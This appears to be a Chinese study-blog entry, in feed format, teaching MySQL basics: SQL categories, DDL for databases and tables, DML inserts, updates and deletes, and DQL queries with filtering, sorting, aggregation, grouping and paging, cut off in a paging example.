    <id>http://example.com/post/JavaWeb-%E6%95%B0%E6%8D%AE%E5%BA%93.html</id>
    <published>2022-06-20T15:09:13.000Z</published>
    <updated>2022-06-22T06:02:08.921Z</updated>
    
    <content type="html"><![CDATA[<p>JavaWeb - 数据库</p><h1 id="1-数据库的相关概念"><a class="markdownIt-Anchor" href="#1-数据库的相关概念">#</a> 1、数据库的相关概念</h1><ul><li>数据库</li><li>数据库管理系统</li><li>SQL</li><li>常见的关系型数据库管理系统</li></ul><p>数据库：</p><ul><li>存储数据的仓库，数据是有组织进行存储</li><li>英文：DataBase，简称 DB</li></ul><p>数据库管理系统：</p><ul><li>管理数据库的大型软件</li><li>英文：DataBase Management System，简称 DBMS</li></ul><p>SQL：</p><ul><li>英文：Structured Query Language，简称 SQL，结构化查询语言</li><li>操作关系型数据库的语言</li><li>定义操作所有关系型数据库的统一标准</li><li>每一种数据库的操作方式存在不一样的地方，称为 “方言”</li></ul><p>常见的关系型数据库管理系统：</p><ul><li>Oracle：收费，且非常昂贵，金融银行使用 Oracle 的居多</li><li>MySQL：开源的免费的中小型数据库，在互联网公司使用的非常多</li><li>SQL Server：微软的收费数据库，在 Java 中使用的不多</li><li>PostgreSQL：开源中小型数据库</li><li>DB2：IBM 公司的大型收费数据库产品</li><li>SQLite：嵌入式的微型数据库，如：作为 Android 内置数据库</li><li>MariaDB：开源免费中小型数据库</li></ul><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>本次只学习 MySQL，对于后续的其他数据库，都是使用 SQL 操作的，而且 SQL 可以操作市面上所有的关系型数据库</p></blockquote><h1 id="2-mysql数据库"><a class="markdownIt-Anchor" href="#2-mysql数据库">#</a> 2、MySQL 数据库</h1><ul><li>MySQL 安装</li><li>MySQL 卸载</li><li>MySQL 配置</li><li>MySQL 登录、退出</li></ul><p>安装、登录、卸载、配置等参见安装手册</p><ul><li>MySQL 数据模型</li></ul><p>MySQL 数据库模型：</p><ul><li>关系型数据库<ul><li>关系型数据库是建立在关系模型基础上的数据库，简单说，关系型数据库是由多张能够相互连接的二维表组成的数据库</li><li>优点：<ol><li>都是使用表结构，格式一致，易于维护</li><li>使用通用的 SQL 语言操作，使用方便，可用于复杂查询</li><li>数据存储在磁盘中，安全（存在硬盘中就是<strong>持久化存储</strong>）</li></ol></li></ul></li><li>不通过表存取的就是非关系型数据库</li><li>数据库是通过文件夹实现的，MySQL 的数据存放在<strong> data</strong> 目录下，每个文件夹对应一个数据库</li></ul><h1 id="3-sql通用语法"><a class="markdownIt-Anchor" href="#3-sql通用语法">#</a> 3、SQL 通用语法</h1><ol><li>SQL 语句可以以单行或多行书写，以分号结尾</li><li>可以使用空格或制表符来提高可读性</li><li>MySQL 数据库的 SQL 语句不区分大小写，但是关键字<strong>建议以大写来表示</strong></li><li>3 种注释：<ul><li>单行注释：<strong>– 注释内容</strong>  或 <strong>#注释内容</strong></li><li>多行注释：/* 注释内容 */</li></ul></li></ol><h1 id="4-sql分类"><a class="markdownIt-Anchor" href="#4-sql分类">#</a> 4、SQL 分类</h1><p>SQL 语句根据其功能，主要分为四类：DDL、DML、DQL、DCL。 DDL：</p><p>DDL：Data Definition Language 数据定义语言，用来定义数据库对象 (数据库，表， 字段)</p><p>DML：Data Manipulation Language 数据操作语言，用来对数据库表中的数据进行<strong>增删改</strong></p><p>DQL： Data Query Language 数据查询语言，用来<strong>查询</strong>数据库中表的记录</p><p>DCL： Data Control Language 数据控制语言，用来创建数据库用户、控制数据库的<strong>访问权限</strong></p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220620221541057.png" alt="image-20220620221541057"></p><h1 id="5-ddl操作数据库-表"><a class="markdownIt-Anchor" href="#5-ddl操作数据库-表">#</a> 5、DDL：操作数据库、表</h1><h2 id="51-操作数据库crud"><a class="markdownIt-Anchor" href="#51-操作数据库crud">#</a> 5.1 操作数据库：CRUD</h2><ol><li><p>C (Create)：创建</p><ul><li><p>创建数据库：<strong>create database 数据库名称；</strong></p></li><li><p>创建数据库，判断是否存在，不存在再创建：<strong>create database if not exists 数据库名称；</strong></p></li><li><p>创建数据库，并指定字符集：<strong>create database 数据库名称 character set 字符集名；</strong></p></li><li><p>创建一个 db4 的数据库，判断是否存在，并指定字符集为 gbk：<strong>create database if not exists db4 character set gbk;</strong></p></li></ul></li><li><p>R (Retrieve)：查询</p><ul><li>查询所有数据库的名称：<strong>show databases;</strong></li><li>查询创建数据库的 SQL 语句、字符集：<strong>show create database 数据库名；</strong></li></ul></li><li><p>U (Update)：修改</p><ul><li>修改数据库的字符集：<strong>alter database 数据库名称 character set 字符集名；</strong></li></ul></li><li><p>D (Delete)：删除</p><ul><li>删除数据库：<strong>drop database 数据库名称；</strong></li><li>判断数据库是否存在，存在再删除：<strong>drop database if exists 数据库名称；</strong></li></ul></li><li><p>使用数据库</p><ul><li>查询当前正在使用的数据库名称：<strong>select database();</strong></li><li>使用数据库：<strong>use 数据库名称；</strong></li></ul></li></ol><h2 id="52-操作表crud"><a class="markdownIt-Anchor" href="#52-操作表crud">#</a> 5.2 操作表：CRUD</h2><ol><li><p>C (Create)：创建</p><ul><li><p>语法：create table 表名 (</p><p>列明 1 数据类型 1,</p><p>列名 2 数据类型 2,</p><p>…</p><p>列明 n 数据类型 n</p><p>);# 注意最后一列不需要加逗号</p></li><li><p>数据类型</p><ul><li>int：整数类型<ul><li>age int,</li></ul></li><li>double：小数类型<ul><li>score double (5,2)_最多有 5 位，小数点后 2 位</li></ul></li><li>date：日期，只包含年月日，yyyy-MM-dd</li><li>datetime：日期，包含年月日时分秒，yyyy-MM-dd HH:mm:ss</li><li>timestamp：时间戳类型，包含年月日时分秒，如果将来不给这个字段赋值或赋值为 null，则默认使用当前的系统时间来<strong>自动赋值</strong></li><li>varchar：字符串<ul><li>name varchar (20)：姓名最大 20 个字符</li></ul></li></ul></li><li><p>复制一张表，如复制一张 student 为 student1：<strong>create table student1 like student;</strong></p></li><li><p>创建一张学生表</p></li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">create</span> <span class="token keyword">table</span> student<span class="token punctuation">(</span>    <span class="token operator">-</span><span class="token operator">></span> id <span class="token keyword">int</span><span class="token punctuation">,</span>    <span class="token operator">-</span><span class="token operator">></span> name <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token operator">-</span><span class="token operator">></span> age <span class="token keyword">int</span><span class="token punctuation">,</span>    <span class="token operator">-</span><span class="token operator">></span> score <span class="token keyword">double</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token operator">-</span><span class="token operator">></span> birthday <span class="token keyword">date</span><span class="token punctuation">,</span>    <span class="token operator">-</span><span class="token operator">></span> insert_time <span class="token keyword">timestamp</span>    <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>R (Retrieve)：查询</p><ul><li>查询某个数据库中所有表的名称：<strong>show tables;</strong></li><li>查询表结构：<strong>desc 表名称；</strong></li><li>查询表的创建语句：<strong>show create table 表名；</strong></li></ul></li><li><p>U (Update)：修改</p><ul><li>修改表名：<strong>alter table 表名 rename to 新表名；</strong></li><li>修改表的字符集：<strong>show create table 表名；alter table 表名 character set 新字符集名；</strong></li><li>添加一列：<strong>alter table 表名 add 列名 数据类型；</strong></li><li>修改列名称、类型：<strong>alter table 表名 change 旧列名 新列明 新数据类型；<strong> 或</strong> alter table 表名 modify 列名 新数据类型；</strong></li><li>删除列：<strong>alter table 表名 drop 列名；</strong></li></ul></li><li><p>D (Delete)：删除</p><ul><li>删除表：<strong>drop table 表名；</strong></li><li>如果存在，再删除：<strong>drop table if exists 表名；</strong></li></ul></li></ol><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220620224922952.png" alt="image-20220620224922952"></p><h1 id="6-dml增删改表中数据"><a class="markdownIt-Anchor" href="#6-dml增删改表中数据">#</a> 6、DML：增删改表中数据</h1><h2 id="51-添加数据"><a class="markdownIt-Anchor" href="#51-添加数据">#</a> 5.1 添加数据</h2><ul><li>基本语法：<strong>insert into 表名 (列名 1, 列明 2,…, 列明 n) values (值 1, 值 2, 值 3,…, 值 n)</strong></li><li>注意：<ol><li>列明和值要<strong>一一对应</strong></li><li>如果表名后不定义列明，则默认给所有列添加值</li><li>除了数字类型，其他类型需要使用引号 (单双引号都可以) 引起来</li></ol></li></ul><h2 id="52-删除数据"><a class="markdownIt-Anchor" href="#52-删除数据">#</a> 5.2 删除数据</h2><ul><li>基本语法：delete from 表名 [where 条件];<ul><li>删除 id 为 2 的值：delete from stu where id = 2;</li></ul></li><li>注意：<ol><li>如果不加条件，则<strong>删除表中所有记录</strong>，非常危险不要使用</li><li>如果要删除所有记录，两种方法：<ol><li>delete from 表名；-- 不推荐使用，因为有多少条记录就执行多少次指令，效率很低</li><li>**truncate table 表名；** 先删除表，再创建一个和原表一样的空表，推荐使用，效率更高</li></ol></li></ol></li></ul><h2 id="53-修改数据"><a class="markdownIt-Anchor" href="#53-修改数据">#</a> 5.3 修改数据</h2><ul><li>基本语法：update 表名 set 列名 1 = 值 1, 列明 2 = 值 2,…, 列明 n = 值 n [where 条件];<ul><li>将 stu 表内的 id 为 3 的 age 改为 117： <code>UPDATE stu SET age = 117 WHERE id = 3;</code></li><li>更改多条数据： <code>UPDATE stu SET age = 18, score = 100 WHERE id = 2;</code></li></ul></li><li>注意：<ol><li>如果不加任何条件，则会将表中所有记录全部修改</li></ol></li></ul><h1 id="7-dql查询表中的记录"><a class="markdownIt-Anchor" href="#7-dql查询表中的记录">#</a> 7、DQL：查询表中的记录</h1><ul><li>select * from 表名；</li></ul><h2 id="71-语法"><a class="markdownIt-Anchor" href="#71-语法">#</a> 7.1 语法</h2><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>select</p><p>​字段列表</p><p>from</p><p>​表名列表</p><p>where</p><p>​条件列表</p><p>group by</p><p>​分组字段</p><p>having</p><p>​分组之后的条件</p><p>order by</p><p>​排序</p><p>limit</p><p>​分页限定</p></blockquote><h2 id="72-基础查询"><a class="markdownIt-Anchor" href="#72-基础查询">#</a> 7.2 基础查询</h2><ol><li>查询多个字段：<strong>select 字段名 1, 字段名 2,… 字段名 n from 表名；</strong><ul><li>注意：如果查询所有字段，则可以使用 * 来替代字段列表</li></ul></li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 查询姓名 和 年龄</span><span class="token keyword">SELECT</span> NAME<span class="token punctuation">,</span>age <span class="token keyword">FROM</span> student<span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> student<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="2"><li>去除重复：<strong>select distinct 列名 1, 列明 2,… from 表名；</strong></li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 去除重复的结果集</span><span class="token keyword">SELECT</span> <span class="token keyword">DISTINCT</span> address <span class="token keyword">FROM</span> student<span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token keyword">DISTINCT</span> NAME<span class="token punctuation">,</span>address <span class="token keyword">FROM</span> student<span class="token punctuation">;</span><span class="token comment">#当查询多个字段时，只有两个字段组合的值相同了之后才会去重</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>计算列：一般可以使用四则运算来计算列的值，一般只会进行数值型的运算<ul><li>ifnull (表达式 1, 表达式 2)：null 参与的运算，计算结果都是 null<ul><li>表达式 1：哪个字段需要判断是否为 Null</li><li>表达式 2：该字段为 null 则替换后的值</li></ul></li></ul></li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 计算math 和 English 分数之和</span><span class="token keyword">SELECT</span> NAME<span class="token punctuation">,</span>math<span class="token punctuation">,</span>english <span class="token keyword">FROM</span> student<span class="token punctuation">;</span><span class="token keyword">SELECT</span> NAME<span class="token punctuation">,</span>math<span class="token punctuation">,</span>english<span class="token punctuation">,</span>math<span class="token operator">+</span>english <span class="token keyword">FROM</span> student<span class="token punctuation">;</span><span class="token comment">-- 如果有null参与的运算,计算结果都为null</span><span class="token keyword">SELECT</span> NAME<span class="token punctuation">,</span>math<span class="token punctuation">,</span>english<span class="token punctuation">,</span>math<span class="token operator">+</span>IFNULL<span class="token punctuation">(</span>english<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> student<span class="token punctuation">;</span><span class="token comment">-- ifnull(a,b)：如果a为null，替换为b</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li>起别名：列名 as 重命名  或  列明 + 空格 + 重命名<ul><li>as 可以省略，用一个或多个空格代替</li></ul></li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 起别名</span><span class="token keyword">SELECT</span> NAME<span class="token punctuation">,</span>math<span class="token punctuation">,</span>english<span class="token punctuation">,</span>math<span class="token operator">+</span>IFNULL<span class="token punctuation">(</span>english<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> <span class="token string">'总分'</span> <span class="token keyword">FROM</span> student<span class="token punctuation">;</span><span class="token keyword">SELECT</span> NAME<span class="token punctuation">,</span>math 数学<span class="token punctuation">,</span>english 英语<span class="token punctuation">,</span>math<span class="token operator">+</span>IFNULL<span class="token punctuation">(</span>english<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token string">'总分'</span> <span class="token keyword">FROM</span> student<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="73-条件查询"><a class="markdownIt-Anchor" href="#73-条件查询">#</a> 7.3 条件查询</h2><ol><li>where 子句后跟条件</li><li>运算符<ul><li>&gt;、&lt;、&lt;=、&gt;=、=、&lt;&gt;</li><li>BETWEEN…AND</li><li>IN (集合)</li><li>LIKE ‘张 %’ ：模糊查询<ul><li>_：单个任意字符</li><li>%：多个任意字符</li></ul></li><li>IS NULL</li><li>and 或 &amp;&amp;</li><li>or 或 ||</li><li>not 或！</li></ul></li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 查询年龄大于20岁</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> student <span class="token keyword">WHERE</span> age <span class="token operator">>=</span> <span class="token number">20</span><span class="token punctuation">;</span><span class="token comment">-- 查询年龄等于20岁</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> student <span class="token keyword">WHERE</span> age <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span><span class="token comment">-- 查询年龄不等于20岁</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> student <span class="token keyword">WHERE</span> age <span class="token operator">!=</span> <span class="token number">20</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> student <span class="token keyword">WHERE</span> age <span class="token operator">&lt;></span> <span class="token number">20</span><span class="token punctuation">;</span><span class="token comment">-- 查询年龄大于等于20，小于等于30</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> student <span class="token keyword">WHERE</span> age <span class="token operator">>=</span> <span class="token number">20</span> <span class="token operator">AND</span> age <span class="token operator">&lt;=</span> <span class="token number">30</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> student <span class="token keyword">WHERE</span> age <span class="token operator">BETWEEN</span> <span class="token number">20</span> <span class="token operator">AND</span> <span class="token number">30</span><span class="token punctuation">;</span><span class="token comment">-- 查询年龄22岁，19岁，25岁的信息</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> student <span class="token keyword">WHERE</span> age <span class="token operator">=</span> <span class="token number">22</span> <span class="token operator">OR</span> age <span class="token operator">=</span> <span class="token number">19</span> <span class="token operator">OR</span> age <span class="token operator">=</span> <span class="token number">25</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> student <span class="token keyword">WHERE</span> age <span class="token operator">IN</span> <span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">-- 查询英语成绩为null （null值不能使用=判断，只能用is null）</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> student <span class="token keyword">WHERE</span> english <span class="token operator">IS</span> <span class="token boolean">NULL</span><span class="token punctuation">;</span><span class="token comment">-- 查询英语成绩不为null</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> student <span class="token keyword">WHERE</span> english <span class="token operator">IS</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">;</span><span class="token comment">-- 查询姓马的有哪些</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> student <span class="token keyword">WHERE</span> NAME <span class="token operator">LIKE</span> <span class="token string">"马%"</span><span class="token punctuation">;</span><span class="token comment">-- 查询第二个字是化的人</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> student <span class="token keyword">WHERE</span> NAME <span class="token operator">LIKE</span> <span class="token string">"_化%"</span><span class="token punctuation">;</span><span class="token comment">-- 查询姓名是三个字的人</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> student <span class="token keyword">WHERE</span> NAME <span class="token operator">LIKE</span> <span class="token string">"___"</span><span class="token punctuation">;</span><span class="token comment">-- 查询姓名中包含马的人</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> student <span class="token keyword">WHERE</span> NAME <span class="token operator">LIKE</span> <span class="token string">"%马%"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="74-排序查询"><a class="markdownIt-Anchor" href="#74-排序查询">#</a> 7.4 排序查询</h2><ul><li>语法：order by 字句<ul><li>order by 排序字段 1 排序方式 1, 排序字段 2 排序方式 2 …;</li></ul></li><li>排序方式<ul><li>ASC：升序，<strong>默认</strong></li><li>DESC：降序</li></ul></li><li>注意：<ul><li>如果有多个排序条件，则当前面的条件值一样时，才会判断第二条件</li></ul></li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 按照数学成绩排序</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> student <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> math <span class="token keyword">ASC</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> student <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> math <span class="token keyword">DESC</span><span class="token punctuation">;</span><span class="token comment">-- 按照数学成绩排名，如果数学成绩一样，则按照英语成绩排名，都是升序</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> student <span class="token keyword">ORDER</span> <span class="token keyword">BY</span> math <span class="token keyword">ASC</span><span class="token punctuation">,</span> english <span class="token keyword">ASC</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="75-聚合函数"><a class="markdownIt-Anchor" href="#75-聚合函数">#</a> 7.5 聚合函数</h2><ul><li>将一列数据作为一个整体，进行纵向的计算。<ol><li>count：计算个数<ol><li>一般选择非空的列：主键</li><li>count (*) —— 只要这一行数据有一个不为 null 就算作一个数据</li></ol></li><li>max：计算最大值</li><li>min：计算最小值</li><li>sum：计算和</li><li>avg：计算平均值</li></ol></li><li>注意：聚合函数的计算排除了 null 值<ul><li>解决方案：选择不包含空值的列进行计算，或使用<strong> IFNULL</strong> 函数进行计算</li></ul></li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 查询学生的人数</span><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span>NAME<span class="token punctuation">)</span> <span class="token keyword">FROM</span> student<span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span>IFNULL<span class="token punctuation">(</span>english<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> student<span class="token punctuation">;</span><span class="token comment">-- 数学成绩的最大值和最小值</span><span class="token keyword">SELECT</span> <span class="token function">MAX</span><span class="token punctuation">(</span>math<span class="token punctuation">)</span> <span class="token keyword">FROM</span> student<span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token function">MIN</span><span class="token punctuation">(</span>math<span class="token punctuation">)</span> <span class="token keyword">FROM</span> student<span class="token punctuation">;</span><span class="token comment">-- 计算数学成绩的和</span><span class="token keyword">SELECT</span> <span class="token function">SUM</span><span class="token punctuation">(</span>math<span class="token punctuation">)</span> <span class="token keyword">FROM</span> student<span class="token punctuation">;</span><span class="token comment">-- 计算数学成绩的平均值</span><span class="token keyword">SELECT</span> <span class="token function">AVG</span><span class="token punctuation">(</span>math<span class="token punctuation">)</span> <span class="token keyword">FROM</span> student<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="76-分组查询"><a class="markdownIt-Anchor" href="#76-分组查询">#</a> 7.6 分组查询</h2><ul><li>基本语法：<strong>group by 分组字段</strong></li><li>注意：<ol><li>分组之后查询的字段：<strong>分组字段、聚合函数</strong>，写其他字段没有任何意义</li><li>where 和 having 的区别：<ol><li>where 在分组之前进行限定，如果不满足这个条件则不参与分组。having 是在分组之后进行限定，如果不满足结果则不会被查询出来。</li><li>where 后<strong>不可以跟聚合函数</strong>，having<strong> 可以进行聚合函数的判断</strong></li></ol></li></ol></li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 按照性别分组，分别查男女同学的平均分</span><span class="token keyword">SELECT</span> sex<span class="token punctuation">,</span><span class="token function">AVG</span><span class="token punctuation">(</span>math<span class="token punctuation">)</span> <span class="token keyword">FROM</span> student <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> sex<span class="token punctuation">;</span><span class="token comment">-- 按照性别分组，分别查男女同学的平均分、人数</span><span class="token keyword">SELECT</span> sex<span class="token punctuation">,</span><span class="token function">AVG</span><span class="token punctuation">(</span>math<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">COUNT</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token keyword">FROM</span> student <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> sex<span class="token punctuation">;</span><span class="token comment">-- 按照性别分组，分别查男女同学的平均分、人数,要求分数低于70分的不参与分组</span><span class="token keyword">SELECT</span> sex<span class="token punctuation">,</span><span class="token function">AVG</span><span class="token punctuation">(</span>math<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">COUNT</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token keyword">FROM</span> student <span class="token keyword">WHERE</span> math <span class="token operator">></span> <span class="token number">70</span> <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> sex<span class="token punctuation">;</span><span class="token comment">-- 按照性别分组，分别查男女同学的平均分、人数,要求分数低于70分的不参与分组,分组之后人数要大于两个人</span><span class="token keyword">SELECT</span> sex<span class="token punctuation">,</span><span class="token function">AVG</span><span class="token punctuation">(</span>math<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">COUNT</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token keyword">FROM</span> student <span class="token keyword">WHERE</span> math <span class="token operator">></span> <span class="token number">70</span> <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> sex <span class="token keyword">HAVING</span> <span class="token function">COUNT</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> sex<span class="token punctuation">,</span><span class="token function">AVG</span><span class="token punctuation">(</span>math<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">COUNT</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span> 人数 <span class="token keyword">FROM</span> student <span class="token keyword">WHERE</span> math <span class="token operator">></span> <span class="token number">70</span> <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> sex <span class="token keyword">HAVING</span> 人数<span class="token operator">></span><span class="token number">2</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="77-分页查询"><a class="markdownIt-Anchor" href="#77-分页查询">#</a> 7.7 分页查询</h2><ul><li>基本语法：limit 开始的索引，每页查询的条数；</li><li>公式：*<em> 开始的索引 = （当前页码 - 1）<em>每页显示的条数</em></em></li><li>分页操作是一个<strong>方言</strong></li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 每页显示3条记录 